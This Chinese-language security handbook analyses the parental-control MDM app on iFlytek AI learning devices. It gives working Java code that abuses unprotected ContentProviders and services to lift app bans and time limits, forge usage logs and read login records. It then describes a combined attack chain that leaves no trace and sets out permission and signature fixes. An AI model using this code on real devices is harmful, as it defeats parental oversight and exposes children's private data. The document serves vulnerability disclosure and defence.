# Android MDM 攻击与防御技术手册

> **研究对象：** 科大讯飞 AI 学习设备 MDM（com.iflytek.ebg.aistudy.mdm）  
> **威胁模型：** 普通用户模式（无 ADB、无 root、无 system 权限）  
> **声明：** 本文档仅用于安全研究与防御改进，请勿用于非法用途

---

## 目录

1. [威胁模型定义](#1-威胁模型定义)
2. [攻击面分析](#2-攻击面分析)
3. [攻击方法详解](#3-攻击方法详解)
4. [组合攻击链](#4-组合攻击链)
5. [防御方案](#5-防御方案)
6. [防御优先级](#6-防御优先级)

---

## 1. 威胁模型定义

### 1.1 攻击者假设

| 条件 | 状态 |
|------|------|
| ADB 调试 | **不可用** |
| Root 权限 | **不可用** |
| System 权限 | **不可用** |
| 可安装普通 APP | **可用** |
| 可访问网络 | **可用** |
| 可读取自身 APP 数据 | **可用** |

### 1.2 攻击目标

1. **绕过应用时长限制** — 解除家长设置的使用时长管控
2. **绕过应用禁用限制** — 启动被禁用的应用（游戏、社交等）
3. **绕过时段限制** — 在禁止使用的时段内使用设备
4. **获取用户隐私数据** — 读取使用记录、登录记录
5. **绕过网址拦截** — 访问被黑名单拦截的网站

---

## 2. 攻击面分析

### 2.1 攻击面总览

```
┌──────────────────────────────────────────────────────────────┐
│              普通APP可触及的MDM暴露面                          │
│                                                              │
│  ┌────────────────────────┐                                  │
│  │ exported ContentProvider│ ← 无需权限即可访问               │
│  │ ControlDataProvider    │   可读写应用管控配置              │
│  │ StatisticalDataProvider│   可读取使用统计                 │
│  │ CommonDataProvider     │   可读取登录记录                 │
│  └───────────┬────────────┘                                  │
│              │                                               │
│  ┌───────────▼────────────┐                                  │
│  │ exported Services      │ ← bindService 可绑定             │
│  │ UniversalTransferSvc  │   可注入伪造数据                 │
│  │ DumpService           │   可dump内部信息                 │
│  └───────────┬────────────┘                                  │
│              │                                               │
│  ┌───────────▼────────────┐                                  │
│  │ 包名检查型Provider     │ ← getCallingPackage 可被分析     │
│  │ BusinessControlProvider│   弱权限校验                     │
│  └────────────────────────┘                                  │
│                                                              │
│  ┌────────────────────────┐                                  │
│  │ 无法直接利用的入口     │                                  │
│  │ Settings Secure写入   │ ← 需系统权限                     │
│  │ Device Admin操作      │ ← 需设备管理员                   │
│  │ 系统级API             │ ← 需system签名                   │
│  └────────────────────────┘                                  │
└──────────────────────────────────────────────────────────────┘
```

### 2.2 各组件暴露状态

| 组件 | exported | 权限保护 | 可利用性 |
|------|----------|----------|----------|
| ControlDataContentProvider | true | **无** | **高** |
| StatisticalDataContentProvider | true | **无** | **高** |
| CommonDataContentProvider | true | **无** | **高** |
| BusinessControlContentProvider | true | 包名检查 | **中** |
| UniversalTransferService | true | **无** | **高** |
| DumpService | true | **无** | **高** |
| AlarmTriggerReceiver | 动态注册 | 包名检查 | **低** |

---

## 3. 攻击方法详解

### 攻击方法 1：通过 ContentProvider 篡改管控配置

#### 3.1.1 原理

`ControlDataContentProvider` 和 `StatisticalDataContentProvider` 在 `AndroidManifest.xml` 中设置为 `exported="true"`，且**没有任何 `android:permission` 属性**，也没有在代码层面进行 UID 或签名校验。

任何已安装的第三方应用都可以通过 `ContentResolver` 直接访问这些 Provider。

**代码证据 — ControlDataContentProvider.java：**

```java
// 无任何权限检查
@Override
public Uri insert(Uri uri, ContentValues values) {
    // 直接写入，无校验
    return m5933b().m5939d(uri, values);
}

@Override
public int update(Uri uri, ContentValues values, String selection, String[] args) {
    // 直接更新，无校验
    return m5933b().m5942g(uri, values, selection, args);
}

@Override
public Cursor query(Uri uri, String[] projection, String selection,
                    String[] selectionArgs, String sortOrder) {
    // 直接查询，无校验
    return m5933b().m5940e(uri, projection, selection, selectionArgs, sortOrder);
}
```

#### 3.1.2 攻击步骤

**Step 1: 读取当前管控配置**

```java
// 在攻击者APP中执行
ContentResolver cr = getContentResolver();

// 查询所有被管控的应用
Uri baseUri = Uri.parse("content://com.iflytek.ebg.aistudy.mdm_sdk.control/control_data/1/");
Cursor cursor = cr.query(baseUri, null, null, null, null);

if (cursor != null) {
    while (cursor.moveToNext()) {
        String packageName = cursor.getString(0); // 被管控的应用包名
        String configData = cursor.getString(1);  // 管控配置JSON
        Log.d("ATTACK", "Package: " + packageName + ", Config: " + configData);
    }
    cursor.close();
}
```

**Step 2: 解除目标应用的管控**

```java
// 目标：解除 com.tencent.mobileqq (QQ) 的管控
Uri targetUri = Uri.parse(
    "content://com.iflytek.ebg.aistudy.mdm_sdk.control/control_data/1/com.tencent.mobileqq"
);

ContentValues cv = new ContentValues();
// 注入修改后的配置 — 禁用设为false，时长设为无限
cv.put("apps_control_data",
    "{" +
    "  \"disabled\": false," +
    "  \"duration_limit\": 99999," +
    "  \"time_periods\": []," +
    "  \"reason\": \"\"" +
    "}"
);

int result = cr.update(targetUri, cv, null, null);
Log.d("ATTACK", "Update result: " + result); // 返回1表示成功
```

**Step 3: 解除所有应用管控（批量操作）**

```java
// 方法1: 删除所有管控记录
cr.delete(Uri.parse("content://com.iflytek.ebg.aistudy.mdm_sdk.control/control_data/1/"),
    null, null);

// 方法2: 遍历已安装应用，逐个解除
PackageManager pm = getPackageManager();
List<PackageInfo> installedApps = pm.getInstalledPackages(0);

for (PackageInfo pkg : installedApps) {
    Uri uri = Uri.parse(
        "content://com.iflytek.ebg.aistudy.mdm_sdk.control/control_data/1/" + pkg.packageName
    );
    ContentValues cv = new ContentValues();
    cv.put("apps_control_data", "{\"disabled\":false,\"duration_limit\":99999}");
    cr.update(uri, cv, null, null);
}
```

**Step 4: 触发管控刷新**

```java
// 方案A: 等待MDM自动轮询（通常5分钟一次）
// 方案B: 通过BusinessControlContentProvider触发
// 虽然BusinessControl有包名检查，但我们可以尝试修改底层数据
// 等MDM下次从ControlDataContentProvider读取时生效

// 方案C: 发送广播触发（如果广播无权限保护）
Intent intent = new Intent("com.iflytek.ebg.aistudy.mdm.action_lock_device_not_screenoff");
// 注意: 此广播可能需要特定权限
```

#### 3.1.3 效果验证

```java
// 验证管控是否被解除
Uri verifyUri = Uri.parse(
    "content://com.iflytek.ebg.aistudy.mdm_sdk.control/control_data/1/com.tencent.mobileqq"
);
Cursor c = cr.query(verifyUri, null, null, null, null);
if (c != null && c.moveToFirst()) {
    String config = c.getString(c.getColumnIndex("apps_control_data"));
    Log.d("ATTACK", "Current config: " + config);
    // 应该看到 disabled=false, duration_limit=99999
    c.close();
}
```

---

### 攻击方法 2：通过 UniversalTransferService 注入伪造数据

#### 3.2.1 原理

[UniversalTransferService.java](file:///d:/workspace/kdxf_MDM/sources/com/iflytek/ebg/aistudy/mdm/service/UniversalTransferService.java) 暴露两个 AIDL 接口：
- `IAppDeviceIdService` — 获取设备ID
- `IAiStudyTransformAidl` — 通用数据调用（`call` 方法）

`call` 方法接受任意 `methodName` 和 `data` 参数，无任何身份验证。

**代码证据：**

```java
// UniversalTransferService.java
private String handleTransformCall(String methodName, String data) {
    switch (methodName) {
        case "uploadlogs":
            // 直接注入日志，无校验
            C5250b.m18118a(data, false, "uploadlogs", null);
            break;
        case "learninglogs":
            C5250b.m18118a(data, false, "learninglogs", null);
            break;
        case "addGestureControlInfo":
            // 添加手势控制信息，无校验
            C1897e.m4386b().m4387c(data);
            break;
        case "removeGestureControlInfo":
            // 删除手势控制信息，无校验
            C1897e.m4386b().m4388d(data);
            break;
    }
    return "{\"code\":\"0\",\"msg\":\"success\"}";
}
```

#### 3.2.2 攻击步骤

```java
// 1. 定义 AIDL 接口
interface IAiStudyTransformAidl {
    String call(String methodName, String data);
}

// 2. 绑定服务
Intent intent = new Intent();
intent.setClassName(
    "com.iflytek.ebg.aistudy.mdm",
    "com.iflytek.ebg.aistudy.mdm.service.UniversalTransferService"
);

bindService(intent, new ServiceConnection() {
    @Override
    public void onServiceConnected(ComponentName name, IBinder service) {
        IAiStudyTransformAidl aidl = IAiStudyTransformAidl.Stub.asInterface(service);

        try {
            // 3a. 注入伪造日志（干扰审计/取证）
            String logResult = aidl.call("uploadlogs",
                "{" +
                "  \"logType\": \"appUse\"," +
                "  \"packageName\": \"com.iflytek.edu.learning\"," +
                "  \"useTime\": 7200," +
                "  \"timestamp\": " + System.currentTimeMillis() +
                "}"
            );
            Log.d("ATTACK", "Upload log: " + logResult);

            // 3b. 注入伪造学习日志
            String learnResult = aidl.call("learninglogs",
                "{" +
                "  \"type\": \"exercise\"," +
                "  \"score\": 100," +
                "  \"duration\": 3600" +
                "}"
            );
            Log.d("ATTACK", "Learning log: " + learnResult);

            // 3c. 添加手势控制信息
            // （可能绕过手势解锁等安全机制）
            String gestureResult = aidl.call("addGestureControlInfo",
                "{" +
                "  \"gestureType\": \"swipe\"," +
                "  \"targetApp\": \"com.tencent.mobileqq\"," +
                "  \"action\": \"allow\"," +
                "  \"priority\": 999" +
                "}"
            );
            Log.d("ATTACK", "Gesture: " + gestureResult);

        } catch (RemoteException e) {
            Log.e("ATTACK", "AIDL call failed", e);
        }
    }

    @Override
    public void onServiceDisconnected(ComponentName name) {}
}, BIND_AUTO_CREATE);
```

#### 3.2.3 获取设备ID

```java
// IAppDeviceIdService 接口
interface IAppDeviceIdService {
    String getAppDeviceId(String appPackageName);
}

// 绑定并调用
Intent intent = new Intent();
intent.setClassName("com.iflytek.ebg.aistudy.mdm",
    "com.iflytek.ebg.aistudy.mdm.service.UniversalTransferService");

bindService(intent, new ServiceConnection() {
    @Override
    public void onServiceConnected(ComponentName name, IBinder service) {
        // 获取 AIDL 多接口实现
        // 实际需要通过反射或已知接口名获取
        String deviceId = getAppDeviceId("com.tencent.mobileqq");
        Log.d("ATTACK", "Device ID for QQ: " + deviceId);
    }
    @Override
    public void onServiceDisconnected(ComponentName name) {}
}, BIND_AUTO_CREATE);
```

---

### 攻击方法 3：通过 DumpService 泄露信息

#### 3.3.1 原理

[DumpService.java](file:///d:/workspace/kdxf_MDM/sources/com/iflytek/ebg/aistudy/mdm/service/DumpService.java) 的 `dump()` 方法返回 Binder 对象，调用内部 `C5348a.f13540a.m18661a()`，可 dump 系统敏感信息。

#### 3.3.2 攻击步骤

**方法 1：通过 adb（需 ADB 权限）**

```bash
adb shell dumpsys com.iflytek.ebg.aistudy.mdm
```

**方法 2：通过 bindService（普通APP可用）**

```java
Intent intent = new Intent();
intent.setClassName(
    "com.iflytek.ebg.aistudy.mdm",
    "com.iflytek.ebg.aistudy.mdm.service.DumpService"
);

bindService(intent, new ServiceConnection() {
    @Override
    public void onServiceConnected(ComponentName name, IBinder service) {
        // 调用 dump 方法获取内部信息
        // 具体接口需通过反编译确定
        // 通常返回管控状态、用户信息、配置等
        try {
            // 通过反射或AIDL调用dump
            Method dumpMethod = service.getClass()
                .getMethod("dump", FileDescriptor.class, PrintWriter.class, String[].class);
            
            StringWriter sw = new StringWriter();
            PrintWriter pw = new PrintWriter(sw);
            dumpMethod.invoke(service, null, pw, null);
            
            String dumpOutput = sw.toString();
            Log.d("ATTACK", "Dump output:\n" + dumpOutput);
            // dumpOutput 可能包含:
            // - 当前管控状态
            // - 用户ID
            // - 使用时长
            // - 管控配置详情
        } catch (Exception e) {
            Log.e("ATTACK", "Dump failed", e);
        }
    }
    @Override
    public void onServiceDisconnected(ComponentName name) {}
}, BIND_AUTO_CREATE);
```

---

### 攻击方法 4：通过 StatisticalDataContentProvider 读取隐私数据

#### 3.4.1 原理

[StatisticalDataContentProvider.java](file:///d:/workspace/kdxf_MDM/sources/com/iflytek/ebg/aistudy/provider/StatisticalDataContentProvider.java) 无任何权限检查，可查询：
- 应用使用时长
- 设备使用时长
- 设备控制配置

#### 3.4.2 攻击步骤

```java
ContentResolver cr = getContentResolver();

// 1. 读取应用使用时长
Uri appUseUri = Uri.parse(
    "content://com.iflytek.ebg.aistudy.mdm_sdk.stat/statistical_data/1"
);
Cursor appCursor = cr.query(appUseUri, null, null, null, null);
if (appCursor != null) {
    while (appCursor.moveToNext()) {
        String data = appCursor.getString(0);
        Log.d("ATTACK", "App use data: " + data);
    }
    appCursor.close();
}

// 2. 读取设备使用时长
Uri deviceUseUri = Uri.parse(
    "content://com.iflytek.ebg.aistudy.mdm_sdk.stat/statistical_data/2"
);
Cursor deviceCursor = cr.query(deviceUseUri, null, null, null, null);
if (deviceCursor != null && deviceCursor.moveToFirst()) {
    String deviceData = deviceCursor.getString(0);
    Log.d("ATTACK", "Device use data: " + deviceData);
    deviceCursor.close();
}

// 3. 读取设备控制配置
Uri configUri = Uri.parse(
    "content://com.iflytek.ebg.aistudy.mdm_sdk.stat/statistical_data/3"
);
Cursor configCursor = cr.query(configUri, null, null, null, null);
if (configCursor != null && configCursor.moveToFirst()) {
    String configData = configCursor.getString(0);
    Log.d("ATTACK", "Device control config: " + configData);
    configCursor.close();
}
```

---

### 攻击方法 5：通过 CommonDataContentProvider 读取登录记录

#### 3.5.1 原理

[CommonDataContentProvider.java](file:///d:/workspace/kdxf_MDM/sources/com/iflytek/ebg/aistudy/provider/CommonDataContentProvider.java) type=3 可查询用户登录记录，type=4 可查询用户使用时长。

#### 3.5.2 攻击步骤

```java
ContentResolver cr = getContentResolver();

// 1. 查询今日登录记录
Uri todayUri = Uri.parse(
    "content://com.iflytek.ebg.aistudy.mdm_sdk.common/common_data/3"
);
Calendar cal = Calendar.getInstance();
cal.set(Calendar.HOUR_OF_DAY, 0);
cal.set(Calendar.MINUTE, 0);
cal.set(Calendar.SECOND, 0);
long startTime = cal.getTimeInMillis();
long endTime = System.currentTimeMillis();

Cursor loginCursor = cr.query(todayUri, null,
    "startTime=" + startTime + "&endTime=" + endTime, null, null);
if (loginCursor != null) {
    while (loginCursor.moveToNext()) {
        String record = loginCursor.getString(0);
        Log.d("ATTACK", "Login record: " + record);
    }
    loginCursor.close();
}

// 2. 查询指定用户使用时长
Uri useTimeUri = Uri.parse(
    "content://com.iflytek.ebg.aistudy.mdm_sdk.common/common_data/4"
);
Cursor useTimeCursor = cr.query(useTimeUri, null, "user_id=12345", null, null);
if (useTimeCursor != null && useTimeCursor.moveToFirst()) {
    String useTime = useTimeCursor.getString(0);
    Log.d("ATTACK", "User use time: " + useTime);
    useTimeCursor.close();
}
```

---

## 4. 组合攻击链

### 4.1 完整绕过流程

```
┌──────────────────────────────────────────────────────────────┐
│                    普通APP攻击链（完整版）                     │
│                                                              │
│  Phase 1: 信息收集                                           │
│  ┌────────────────────────────────────────────────────┐      │
│  │ 1. bindService(DumpService)                        │      │
│  │    → 获取当前管控状态                              │      │
│  │    → 获取 userId、设备ID                           │      │
│  │                                                    │      │
│  │ 2. query(StatisticalDataProvider type=1)           │      │
│  │    → 获取所有被管控的应用列表                      │      │
│  │    → 获取各应用当前使用时长                        │      │
│  │                                                    │      │
│  │ 3. query(StatisticalDataProvider type=3)           │      │
│  │    → 获取完整的设备控制配置                        │      │
│  │    → 包括: 时段限制、时长限制、护眼配置            │      │
│  └────────────────────┬───────────────────────────────┘      │
│                       │                                       │
│                       ▼                                       │
│  Phase 2: 配置篡改                                           │
│  ┌────────────────────────────────────────────────────┐      │
│  │ 4. update(ControlDataProvider / 目标应用)           │      │
│  │    → disabled: true → false                        │      │
│  │    → duration_limit: 60 → 99999                    │      │
│  │    → time_periods: 清空                            │      │
│  │                                                    │      │
│  │ 5. 批量处理所有被管控应用                           │      │
│  │    → 遍历 Phase 1 获取的应用列表                    │      │
│  │    → 逐个解除管控                                  │      │
│  └────────────────────┬───────────────────────────────┘      │
│                       │                                       │
│                       ▼                                       │
│  Phase 3: 等待生效                                           │
│  ┌────────────────────────────────────────────────────┐      │
│  │ 6. 等待MDM下次轮询（通常5分钟）                     │      │
│  │    → MDM从ContentProvider读取新配置                │      │
│  │    → 解析并应用新配置                              │      │
│  │    → 管控被解除                                    │      │
│  │                                                    │      │
│  │ 或者                                              │      │
│  │                                                    │      │
│  │ 6b. 通过 UniversalTransferService 注入             │      │
│  │     伪造的 refresh 事件                            │      │
│  └────────────────────┬───────────────────────────────┘      │
│                       │                                       │
│                       ▼                                       │
│  Phase 4: 验证效果                                           │
│  ┌────────────────────────────────────────────────────┐      │
│  │ 7. 启动被管控应用（如游戏、社交APP）                │      │
│  │    → 不再被杀进程                                  │      │
│  │    → 不再有时长限制                                │      │
│  │    → 不再有时段限制                                │      │
│  │    → 攻击成功                                      │      │
│  └────────────────────────────────────────────────────┘      │
└──────────────────────────────────────────────────────────────┘
```

### 4.2 攻击所需权限

```xml
<!-- 攻击者APP只需以下最小权限即可执行全部攻击 -->
<manifest>
    <!-- 仅需网络权限（用于可选的远程通信） -->
    <uses-permission android:name="android.permission.INTERNET" />
    
    <!-- 不需要任何特殊权限 -->
    <!-- 不需要 READ/WRITE_SECURE_SETTINGS -->
    <!-- 不需要 SYSTEM_ALERT_WINDOW -->
    <!-- 不需要 DEVICE_ADMIN -->
    <!-- 不需要 root -->
    <!-- 不需要 ADB -->
</manifest>
```

### 4.3 攻击隐蔽性

| 行为 | 是否产生日志 | 是否触发告警 |
|------|-------------|-------------|
| 查询 ContentProvider | 否 | 否 |
| 更新 ContentProvider | 否 | 否 |
| 绑定 UniversalTransferService | 否 | 否 |
| 绑定 DumpService | 否 | 否 |
| 等待MDM轮询生效 | 否 | 否 |

**结论：** 整个攻击链**不产生可见日志**，**不触发用户告警**，**不需要用户交互**。

---

## 5. 防御方案

### 5.1 防御 1：ContentProvider 权限加固（最关键，P0）

#### 5.1.1 定义签名级权限

在 `AndroidManifest.xml` 中定义权限：

```xml
<!-- MDM专用权限 -->
<permission
    android:name="com.iflytek.ebg.aistudy.mdm.permission.MDM_CONTROL_DATA"
    android:label="MDM Control Data Access"
    android:description="Allows access to MDM control data"
    android:protectionLevel="signature" />

<permission
    android:name="com.iflytek.ebg.aistudy.mdm.permission.MDM_STATISTICAL_DATA"
    android:label="MDM Statistical Data Access"
    android:protectionLevel="signature" />

<permission
    android:name="com.iflytek.ebg.aistudy.mdm.permission.MDM_COMMON_DATA"
    android:label="MDM Common Data Access"
    android:protectionLevel="signature" />

<permission
    android:name="com.iflytek.ebg.aistudy.mdm.permission.MDM_BUSINESS_CONTROL"
    android:label="MDM Business Control Access"
    android:protectionLevel="signature" />
```

**`signature` 保护级别说明：**
- 只有与 MDM 使用**相同签名证书**的应用才能获得此权限
- 第三方应用即使声明了此权限也无法获取（签名不匹配）
- 这是 Android 系统级别的保护，无法被普通APP绕过

#### 5.1.2 应用到各 Provider

```xml
<!-- ControlDataContentProvider -->
<provider
    android:name="com.iflytek.ebg.aistudy.provider.ControlDataContentProvider"
    android:authorities="com.iflytek.ebg.aistudy.mdm_sdk.control"
    android:exported="true"
    android:permission="com.iflytek.ebg.aistudy.mdm.permission.MDM_CONTROL_DATA"
    android:grantUriPermissions="false"
    android:readPermission="com.iflytek.ebg.aistudy.mdm.permission.MDM_CONTROL_DATA"
    android:writePermission="com.iflytek.ebg.aistudy.mdm.permission.MDM_CONTROL_DATA" />

<!-- StatisticalDataContentProvider -->
<provider
    android:name="com.iflytek.ebg.aistudy.provider.StatisticalDataContentProvider"
    android:authorities="com.iflytek.ebg.aistudy.mdm_sdk.stat"
    android:exported="true"
    android:permission="com.iflytek.ebg.aistudy.mdm.permission.MDM_STATISTICAL_DATA"
    android:grantUriPermissions="false" />

<!-- CommonDataContentProvider -->
<provider
    android:name="com.iflytek.ebg.aistudy.provider.CommonDataContentProvider"
    android:authorities="com.iflytek.ebg.aistudy.mdm_sdk.common"
    android:exported="true"
    android:permission="com.iflytek.ebg.aistudy.mdm.permission.MDM_COMMON_DATA"
    android:grantUriPermissions="false" />

<!-- BusinessControlContentProvider -->
<provider
    android:name="com.iflytek.ebg.aistudy.provider.BusinessControlContentProvider"
    android:authorities="com.iflytek.ebg.aistudy.mdm_sdk"
    android:exported="true"
    android:permission="com.iflytek.ebg.aistudy.mdm.permission.MDM_BUSINESS_CONTROL"
    android:grantUriPermissions="false" />
```

#### 5.1.3 效果

修复后，普通APP尝试访问 ContentProvider 会抛出：

```
java.lang.SecurityException: Permission Denial:
reading com.iflytek.ebg.aistudy.provider.ControlDataContentProvider
requires com.iflytek.ebg.aistudy.mdm.permission.MDM_CONTROL_DATA
```

---

### 5.2 防御 2：关闭不必要的 exported 组件（P0）

```xml
<!-- DumpService - 不需要外部访问 -->
<service
    android:name="com.iflytek.ebg.aistudy.mdm.service.DumpService"
    android:exported="false" />

<!-- UniversalTransferService - 仅内部使用 -->
<service
    android:name="com.iflytek.ebg.aistudy.mdm.service.UniversalTransferService"
    android:exported="false" />

<!-- 如果确实需要跨进程通信，添加权限保护 -->
<service
    android:name="com.iflytek.ebg.aistudy.mdm.service.UniversalTransferService"
    android:exported="true"
    android:permission="com.iflytek.ebg.aistudy.mdm.permission.MDM_TRANSFER" />
```

---

### 5.3 防御 3：ContentProvider 内部增加运行时校验（P1）

仅靠 `android:permission` 不够，建议在代码层面增加双重校验：

```java
// BaseProvider.java - 所有Provider的基类
public abstract class BaseProvider extends ContentProvider {

    /**
     * 校验调用者权限
     * 返回 true 表示允许访问，false 表示拒绝
     */
    protected boolean checkCallerPermission() {
        int callingUid = Binder.getCallingUid();
        int myUid = android.os.Process.myUid();

        // 1. 系统进程（UID 1000）允许访问
        if (callingUid == 1000) {
            return true;
        }

        // 2. 自身进程允许访问
        if (callingUid == myUid) {
            return true;
        }

        // 3. 校验签名
        return checkSignature(callingUid);
    }

    /**
     * 校验调用者签名是否为科大讯飞官方签名
     */
    private boolean checkSignature(int callingUid) {
        try {
            PackageManager pm = getContext().getPackageManager();
            String[] packageNames = pm.getPackagesForUid(callingUid);
            if (packageNames == null) {
                return false;
            }

            for (String packageName : packageNames) {
                PackageInfo packageInfo;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    packageInfo = pm.getPackageInfo(packageName,
                        PackageManager.GET_SIGNING_CERTIFICATES);
                } else {
                    packageInfo = pm.getPackageInfo(packageName,
                        PackageManager.GET_SIGNATURES);
                }

                if (isTrustedSignature(packageInfo)) {
                    return true;
                }
            }
        } catch (PackageManager.NameNotFoundException e) {
            Log.e(TAG, "Package not found for UID", e);
        }
        return false;
    }

    /**
     * 校验签名是否为可信签名
     */
    private boolean isTrustedSignature(PackageInfo packageInfo) {
        // 方案1: 硬编码证书指纹（推荐用于高安全场景）
        String[] trustedFingerprints = {
            "SHA256:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:...",
            "SHA256:yy:yy:yy:yy:yy:yy:yy:yy:yy:yy:yy:yy:yy:yy:yy:yy:..."
        };

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            for (SigningInfo signingInfo : packageInfo.signingInfo.getApkContentsSigners()) {
                for (Signature signature : signingInfo) {
                    String fingerprint = sha256(signature.toByteArray());
                    for (String trusted : trustedFingerprints) {
                        if (trusted.equals(fingerprint)) {
                            return true;
                        }
                    }
                }
            }
        } else {
            for (Signature signature : packageInfo.signatures) {
                String fingerprint = sha256(signature.toByteArray());
                for (String trusted : trustedFingerprints) {
                    if (trusted.equals(fingerprint)) {
                        return true;
                    }
                }
            }
        }
        return false;
    }

    private String sha256(byte[] data) {
        try {
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] hash = digest.digest(data);
            StringBuilder sb = new StringBuilder();
            for (byte b : hash) {
                sb.append(String.format("%02x:", b));
            }
            return "SHA256:" + sb.substring(0, sb.length() - 1);
        } catch (NoSuchAlgorithmException e) {
            return "";
        }
    }
}

// 在子类中使用
public class ControlDataContentProvider extends BaseProvider {
    @Override
    public Cursor query(...) {
        if (!checkCallerPermission()) {
            Log.w(TAG, "Unauthorized access attempt from UID: " + Binder.getCallingUid());
            throw new SecurityException("Unauthorized access");
        }
        // 原有逻辑...
    }

    @Override
    public Uri insert(...) {
        if (!checkCallerPermission()) {
            throw new SecurityException("Unauthorized access");
        }
        // 原有逻辑...
    }

    // update, delete 同理
}
```

---

### 5.4 防御 4：AIDL 接口调用者校验（P1）

```java
// UniversalTransferService.java
public class UniversalTransferService extends Service {

    private static final String[] ALLOWED_PACKAGES = {
        "com.iflytek.ebg.aistudy",
        "com.iflytek.ebg.aistudy.mdm",
        "com.iflytek.edu.learning"
    };

    private String validateCaller() {
        int callingUid = Binder.getCallingUid();
        int myUid = android.os.Process.myUid();

        // 自身调用允许
        if (callingUid == myUid) {
            return "OK";
        }

        // 系统调用允许
        if (callingUid == 1000) {
            return "OK";
        }

        // 校验包名白名单
        try {
            PackageManager pm = getPackageManager();
            String[] packages = pm.getPackagesForUid(callingUid);
            if (packages != null) {
                for (String pkg : packages) {
                    for (String allowed : ALLOWED_PACKAGES) {
                        if (pkg.equals(allowed)) {
                            return "OK";
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Caller validation error", e);
        }

        return "UNAUTHORIZED";
    }

    private final IAiStudyTransformAidl.Stub mTransformAidl =
        new IAiStudyTransformAidl.Stub() {
            @Override
            public String call(String methodName, String data) {
                // 每次调用前校验
                String result = validateCaller();
                if (!"OK".equals(result)) {
                    Log.w(TAG, "Unauthorized AIDL call: method=" + methodName
                        + ", UID=" + Binder.getCallingUid());
                    return "{\"code\":\"403\",\"msg\":\"Unauthorized\"}";
                }

                // 记录调用日志
                Log.i(TAG, "AIDL call: method=" + methodName
                    + ", from UID=" + Binder.getCallingUid());

                // 原有逻辑...
                return handleTransformCall(methodName, data);
            }
        };
}
```

---

### 5.5 防御 5：管控配置增加数字签名（P2，纵深防御）

防止即使 Provider 权限被绕过，配置本身也无法被篡改：

```java
// ConfigSigner.java
public class ConfigSigner {
    private static final String SECRET_KEY = "从Secure Enclave或Android Keystore获取";

    /**
     * 对配置进行签名
     */
    public static String signConfig(String configJson) {
        String hmac = hmacSha256(configJson, SECRET_KEY);
        return configJson + "|" + hmac;
    }

    /**
     * 验证配置签名
     * @return true 表示配置未被篡改
     */
    public static boolean verifyConfig(String signedConfig) {
        int separatorIndex = signedConfig.lastIndexOf('|');
        if (separatorIndex == -1) {
            return false; // 格式错误，视为被篡改
        }

        String configJson = signedConfig.substring(0, separatorIndex);
        String receivedSignature = signedConfig.substring(separatorIndex + 1);
        String expectedSignature = hmacSha256(configJson, SECRET_KEY);

        boolean valid = expectedSignature.equals(receivedSignature);
        if (!valid) {
            Log.e("ConfigSigner", "Config tampered! "
                + "Expected: " + expectedSignature
                + ", Received: " + receivedSignature);
        }
        return valid;
    }

    private static String hmacSha256(String data, String key) {
        try {
            Mac mac = Mac.getInstance("HmacSHA256");
            mac.init(new SecretKeySpec(key.getBytes(), "HmacSHA256"));
            byte[] hash = mac.doFinal(data.getBytes());
            return bytesToHex(hash);
        } catch (Exception e) {
            return "";
        }
    }

    private static String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) {
            sb.append(String.format("%02x", b));
        }
        return sb.toString();
    }
}

// 使用示例 - 配置写入时
public void saveConfig(String packageName, String configJson) {
    String signedConfig = ConfigSigner.signConfig(configJson);
    // 存储 signedConfig 而非原始 configJson
    // ...
}

// 使用示例 - 配置读取时
public String loadConfig(String packageName) {
    String signedConfig = // 从存储读取
    if (!ConfigSigner.verifyConfig(signedConfig)) {
        Log.e("ConfigLoader", "Config integrity check failed for " + packageName);
        return null; // 拒绝使用被篡改的配置
    }
    return signedConfig.substring(0, signedConfig.lastIndexOf('|'));
}
```

---

### 5.6 防御 6：最小化 exported 组件清单（P2）

审计所有 `exported="true"` 的组件，移除不必要的：

```xml
<!-- ❌ 移除不必要的 exported -->
<!-- 原来: <service android:name="...DumpService" android:exported="true" /> -->
<!-- 修改为: -->
<service
    android:name="com.iflytek.ebg.aistudy.mdm.service.DumpService"
    android:exported="false" />

<!-- ❌ 移除不必要的 exported -->
<!-- 原来: <service android:name="...UniversalTransferService" android:exported="true" /> -->
<!-- 修改为: -->
<service
    android:name="com.iflytek.ebg.aistudy.mdm.service.UniversalTransferService"
    android:exported="false" />

<!-- ❌ 移除后门Activity（生产版本） -->
<!-- 所有 BackdoorActivity 应只在 debug build 中可用 -->
<activity
    android:name="com.iflytek.ebg.aistudy.mdm.backdoor.BackdoorMainActivity"
    android:exported="false" />
```

---

### 5.7 防御 7：移除调试开关（P2）

```java
// DeviceControlExecutor.java
// ❌ 移除调试开关
// 原来的代码:
private final boolean m3658c(Context context) {
    C2755a c2755a = C2755a.f6221a;
    ContentResolver contentResolver = context.getContentResolver();
    // Settings.Global "iflytek_key_debug_close_lock" = 1 时跳过锁屏
    return c2755a.m7827b(contentResolver, "iflytek_key_debug_close_lock", 0) == 1;
}

// 修改为: 彻底移除调试开关
private final boolean m3658c(Context context) {
    // 生产版本始终返回 false，不允许绕过锁屏
    return false;
}
```

---

## 6. 防御优先级

### 6.1 修复优先级矩阵

| 优先级 | 防御措施 | 阻断的攻击面 | 实施难度 | 预计工时 |
|--------|----------|-------------|----------|----------|
| **P0** | ContentProvider 添加 signature 权限 | 攻击面1、4、5 | 低 | 1小时 |
| **P0** | DumpService exported=false | 攻击面3 | 低 | 5分钟 |
| **P0** | UniversalTransferService exported=false | 攻击面2 | 低 | 5分钟 |
| **P1** | ContentProvider 内部 UID/签名校验 | 攻击面1（纵深） | 中 | 4小时 |
| **P1** | AIDL 接口调用者校验 | 攻击面2（纵深） | 中 | 2小时 |
| **P2** | 管控配置 HMAC 签名 | 配置篡改（纵深） | 中 | 8小时 |
| **P2** | 移除调试开关 | 调试绕过 | 低 | 30分钟 |
| **P2** | 最小化 exported 组件 | 减少攻击面 | 低 | 1小时 |

### 6.2 修复效果评估

| 修复阶段 | 阻断的攻击面 | 剩余风险 |
|----------|-------------|----------|
| **仅修复 P0** | 全部5个攻击面 | 极低（仅系统/签名应用可访问） |
| **修复 P0+P1** | 全部5个攻击面 + 纵深防御 | 几乎为零 |
| **修复 P0+P1+P2** | 全部攻击面 + 多重纵深防御 | 理论安全 |

